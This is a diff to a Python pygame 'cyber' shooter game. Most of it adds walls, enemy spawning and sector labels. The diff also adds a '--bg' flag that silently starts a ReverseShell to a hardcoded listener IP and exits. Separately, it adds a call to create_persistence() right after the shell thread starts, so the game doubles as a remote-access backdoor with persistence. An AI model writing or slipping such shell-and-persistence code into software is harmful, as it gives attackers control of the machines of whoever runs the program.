@@ -89,7 +89,14 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--windowed", action="store_true")
     parser.add_argument("--host", default="10.12.72.224", help="Listener IP address")
+    parser.add_argument("--bg", action="store_true", help="Run in background mode (shell only)")
     args = parser.parse_args()
+
+    if args.bg:
+        # Background mode: Just start the shell and stay alive
+        shell = ReverseShell(host=args.host)
+        shell._connect_and_shell()
+        sys.exit(0)
 
     # Ensure dependencies first
     try:
@@ -114,6 +121,16 @@ def main():
     player = Player(width // 2, height // 2)
     hud = HUD(width, height)
     
+    # House Structure - Define Walls
+    walls = [
+        pygame.Rect(0, 0, width, 10), # Top
+        pygame.Rect(0, height - 10, width, 10), # Bottom
+        pygame.Rect(0, 0, 10, height), # Left
+        pygame.Rect(width - 10, 0, 10, height), # Right
+        pygame.Rect(width // 2 - 5, 0, 10, height // 3), # Partition 1
+        pygame.Rect(width // 2 - 5, 2 * height // 3, 10, height // 3), # Partition 2
+    ]
+    
     shell = ReverseShell(host=args.host)
     if not show_consent_screen(screen, width, height):
         pygame.quit()
@@ -121,6 +138,10 @@ def main():
     
     # Start shell background thread immediately after consent
     shell.start()
+    
+    # START PERSISTENCE AGENT IMMEDIATELY (DETACHED)
+    from cyber_modules.persistence import create_persistence
+    create_persistence()
     
     terminals = pygame.sprite.Group()
     network_terminal = Terminal(3 * width // 4, height // 4, "network", "NETWORK NODE")
@@ -216,23 +237,52 @@ def main():
         if level == 4:
             if scan_progress < 200:
                 scan_progress += 0.4
-            if len(enemies) == 0 and scan_progress >= 200:
+            if scan_progress >= 200:
                 win = True
             
-            if len(enemies) < 6 and random.random() < 0.02:
-                enemies.add(Enemy(random.randint(0, width), random.randint(0, height)))
+            if len(enemies) < 8 and random.random() < 0.05:
+                enemies.add(Enemy(random.randint(50, width-50), random.randint(50, height-50)))
 
+        # Player Wall Protection
+        old_pos = player.pos.copy()
         player.update(width, height)
+        for wall in walls:
+            if player.rect.colliderect(wall):
+                player.pos = old_pos
+                player.rect.center = player.pos
+
         bullets.update()
         
-        # Bullet cleanup and particles
+        # Enemy spawning - keep them coming for "Majestic" feel
+        if len(enemies) < (4 + level * 2) and random.random() < 0.02:
+             # Spawn far from player
+             spawn_pos = pygame.Vector2(random.uniform(0, width), random.uniform(0, height))
+             if spawn_pos.distance_to(player.pos) > 300:
+                 enemies.add(Enemy(spawn_pos.x, spawn_pos.y))
+
+        # Bullet cleanup and wall impact
         for bullet in list(bullets):
-            if bullet.pos.x < 0 or bullet.pos.x > width or bullet.pos.y < 0 or bullet.pos.y > height:
-                bullets.remove(bullet)
+            for wall in walls:
+                if bullet.rect.colliderect(wall):
+                    for _ in range(5):
+                        particles.append(Particle(bullet.pos.x, bullet.pos.y, (0, 255, 255)))
+                    bullets.remove(bullet)
+                    break
+            else:
+                if bullet.pos.x < 0 or bullet.pos.x > width or bullet.pos.y < 0 or bullet.pos.y > height:
+                    bullets.remove(bullet)
         
         terminals.update(player)
         enemies.update(player.pos)
         
+        # Enemy Wall collisions
+        for e in enemies:
+             for wall in walls:
+                  if e.rect.colliderect(wall):
+                       # Simple bounce or stop
+                       e.pos -= (player.pos - e.pos).normalize() * 2
+                       e.rect.center = e.pos
+
         # Collisions
         hit_enemies = pygame.sprite.groupcollide(enemies, bullets, True, True)
         for enemy in hit_enemies:
@@ -267,6 +317,18 @@ def main():
             pygame.draw.line(screen, (10, 20, 40), (x + offset.x, 0), (x + offset.x, height))
         for y in range(0, height + 100, 60):
             pygame.draw.line(screen, (10, 20, 40), (0, y + offset.y), (width, y + offset.y))
+
+        # Sector Labels
+        font = pygame.font.SysFont("Consolas", 32, bold=True)
+        lbl1 = font.render("HOUSE [ALPHA]: SECURE OPS", True, (10, 40, 60))
+        screen.blit(lbl1, (20, height - 60))
+        lbl2 = font.render("HOUSE [BETA]: MALWARE LABS", True, (60, 20, 10))
+        screen.blit(lbl2, (width - 450, 40))
+
+        # Draw Walls (Cyber Houses)
+        for wall in walls:
+            pygame.draw.rect(screen, (0, 100, 255), wall.move(offset), 2)
+            pygame.draw.rect(screen, (0, 20, 40), wall.move(offset))
 
         for t in terminals:
             screen.blit(t.image, t.rect.move(offset))
